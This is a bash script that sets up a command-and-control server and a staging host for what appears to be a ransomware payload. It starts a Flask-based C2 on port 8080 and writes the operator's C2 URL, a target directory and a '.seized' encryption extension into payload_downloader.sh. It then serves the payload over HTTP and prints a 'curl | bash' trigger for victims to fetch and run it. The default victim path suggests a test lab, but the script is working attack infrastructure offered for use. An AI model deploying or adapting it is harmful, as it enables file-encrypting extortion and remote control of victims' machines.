#!/bin/bash
# Setup: Run as root or with sudo for port binding
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

pip3 install -r requirements.txt  # Install Flask
python3 c2_server.py &  # Start C2 on 0.0.0.0:8080

# Resolve operator configuration
ENV_FILE="$SCRIPT_DIR/.env"
if [[ -f "$ENV_FILE" ]]; then
    # shellcheck disable=SC1090
    source "$ENV_FILE"
fi

HOST_IP="$(hostname -I | awk '{print $1}')"
DEFAULT_C2_URL="http://$HOST_IP:8080"
C2_URL="${C2_URL:-$DEFAULT_C2_URL}"
if [[ "$C2_URL" == "http://attacker-ip:8080" ]]; then
    C2_URL="$DEFAULT_C2_URL"
fi
TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"
ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"

echo "C2 running at $C2_URL"

# Render payload with baked-in defaults so victims inherit operator config
PAYLOAD_HOST_DIR="${SCRIPT_DIR}/.served_payload"
rm -rf "$PAYLOAD_HOST_DIR"
mkdir -p "$PAYLOAD_HOST_DIR"

cp "$SCRIPT_DIR/.env" "$PAYLOAD_HOST_DIR/.env" 2>/dev/null || true

PAYLOAD_SOURCE="$SCRIPT_DIR/payload_downloader.sh"
PAYLOAD_TARGET="$PAYLOAD_HOST_DIR/payload_downloader.sh"
cp "$PAYLOAD_SOURCE" "$PAYLOAD_TARGET"

export C2_URL TARGET_DIR ENCRYPTED_EXT PAYLOAD_TARGET

python3 - <<'PY'
import os
from pathlib import Path

def shell_escape(value: str) -> str:
    return value.replace('\\', '\\\\').replace('"', '\\"').replace('$', '\\$')

payload_path = Path(os.environ['PAYLOAD_TARGET'])
c2_value = shell_escape(os.environ['C2_URL'])
target_dir_value = shell_escape(os.environ['TARGET_DIR'])
ext_value = shell_escape(os.environ['ENCRYPTED_EXT'])

replacements = {
    'C2_URL="${C2_URL:-http://attacker-ip:8080}"': f'C2_URL="${{C2_URL:-{c2_value}}}"',
    'TARGET_DIR="${TARGET_DIR:-/tmp/test_victim}"': f'TARGET_DIR="${{TARGET_DIR:-{target_dir_value}}}"',
    'ENCRYPTED_EXT="${ENCRYPTED_EXT:-.seized}"': f'ENCRYPTED_EXT="${{ENCRYPTED_EXT:-{ext_value}}}"',
}

text = payload_path.read_text()
for old, new in replacements.items():
    if old not in text:
        continue
    text = text.replace(old, new)
payload_path.write_text(text)
PY

# Host payload via python http.server (port 8000) from rendered directory
nohup python3 -m http.server 8000 --directory "$PAYLOAD_HOST_DIR" > /dev/null 2>&1 &

PAYLOAD_URL="http://$HOST_IP:8000/payload_downloader.sh"
echo "Payload URL for curl: $PAYLOAD_URL"
echo "Test trigger: curl -s $PAYLOAD_URL | bash"
echo "Victim test data is generated automatically when the payload runs on the target."
